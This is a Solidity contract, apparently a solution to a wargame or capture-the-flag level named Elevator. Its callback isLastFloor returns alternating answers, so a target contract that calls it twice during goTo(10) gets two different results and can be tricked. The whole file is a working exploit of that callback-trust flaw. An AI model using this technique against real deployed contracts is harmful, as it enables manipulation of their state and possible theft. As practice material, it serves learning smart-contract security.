// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256) external;
}

/// @notice Returns different answers to Elevator's two callbacks in one call.
contract ElevatorSolver {
    bool private nextAnswer = true;

    function isLastFloor(uint256) external returns (bool) {
        nextAnswer = !nextAnswer;
        return nextAnswer;
    }

    /// @notice Requests floor 10 so the target performs both callback checks.
    function solve(address target) external {
        IElevator(target).goTo(10);
    }
}
